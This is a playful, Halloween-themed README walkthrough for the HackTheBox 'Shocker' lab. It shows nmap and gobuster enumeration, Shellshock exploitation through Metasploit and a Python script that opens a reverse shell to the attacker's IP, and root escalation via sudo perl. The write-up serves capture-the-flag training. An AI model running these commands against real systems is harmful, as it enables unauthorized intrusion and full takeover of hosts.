# Shocker_HTB
This is my spooky themed walkthrough for the Shocker Machine!

🎃 HTB Shocker Writeup 🎃
A Spooky Walkthrough for HackTheBox's "Shocker" Machine
👻 Introduction
Welcome, brave hacker! Today, we're tackling Shocker—a "spookily" easy machine from HackTheBox that teaches us about the terrifying Shellshock vulnerability (CVE-2014-6271).

This guide is designed for beginners, so grab your pumpkin spice latte ☕ and let’s get hacking!

🕵️ Step 1: Enumeration (Finding Doors to Knock On)
First, we scan the machine to see what’s running:

```bash
nmap -sV -sC -T4 10.xx.xx.xx
```

![1 nmap](https://github.com/user-attachments/assets/ae0d7e3a-eafd-48c3-89db-50c8ca38b47b)


👻 Spooky Findings:

Port 80 (HTTP) – Apache 2.4.18 (👀 old and vulnerable!)

Port 2222 (SSH) – OpenSSH 7.2p2 (Not our target today.)

🎃 Clue: The machine is named "Shocker"—hinting at Shellshock!

🔍 Step 2: Web Directory Fuzzing (Looking for Hidden Treats)
We use Gobuster to find hidden files/directories:

```bash
gobuster dir -u http://10.xx.xx.xx -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl
```

![2 gobuster](https://github.com/user-attachments/assets/ac22882f-9732-49fc-8e56-39d047fe5da2)


👻 Spooky Findings:

/cgi-bin/ (403 Forbidden)

/cgi-bin/user.sh (200 OK – Jackpot! 🎃)

![3 fuzz user sh](https://github.com/user-attachments/assets/a94da36c-71f8-4948-be0c-d014cd412684)


💥 Step 3: Exploiting Shellshock (The Real Horror Show)
Shellshock lets us inject malicious code into web requests. We exploit it two ways:

🎃 Method 1: Metasploit (Easy Mode)

```bash
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.xx.xx.xx
set TARGETURI /cgi-bin/user.sh
set LHOST <YOUR_IP>
exploit
```
BOOM! You get a reverse shell as shelly.

🎃 Method 2: Manual Exploit (For the Brave)
Download the Shellshock Python exploit:

```bash
./shellshock.py payload=reverse rhost=10.10.10.56 lhost=<YOUR_IP> lport=4444 pages=/cgi-bin/user.sh
```

👻 Spooky Result: You get a shell!

👑 Step 4: Privilege Escalation (Becoming the Pumpkin King)
Now, let’s become root!

Check sudo permissions:

```bash
sudo -l
```

Output:


(root) NOPASSWD: /usr/bin/perl
"Oh, Perl can run as root? Spooky!"

Exploit Perl to get a root shell:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh"'
```


🎃 Congratulations! You’re now root!

Grab the flags:

![4 user flag](https://github.com/user-attachments/assets/7d35108d-53cf-4eca-a9cb-1cf8cafbda0a)


![5 root flag](https://github.com/user-attachments/assets/9fe8a698-961d-4215-b0be-ee1faf594421)


```bash
cat /home/shelly/user.txt   # User flag
cat /root/root.txt          # Root flag
```

👻 Lessons Learned
Shellshock is a scary vulnerability in old Bash versions.

Always check sudo permissions—sometimes they’re misconfigured!

Enumeration is key—don’t skip scanning and fuzzing!

🎃 Final Words
Hope you enjoyed this spooky walkthrough! Now go forth and haunt more machines! 👻💀

Happy Hacking! 🎃

📜 Credits & Resources
Shellshock Exploit: Exploit-DB 34900

HTB Shocker Machine: HackTheBox

Pumpkins: 🎃🎃🎃 (Because why not?)

👻 Want more spooky writeups?
⭐ Star this repo and follow for more hauntingly good guides!

🎃 "The only thing we have to fear is… a misconfigured sudo permission."
— Probably Abraham Lincoln, if he was a hacker.

This spooky README.md is designed to be fun and easy to follow while keeping the technical details accurate. 

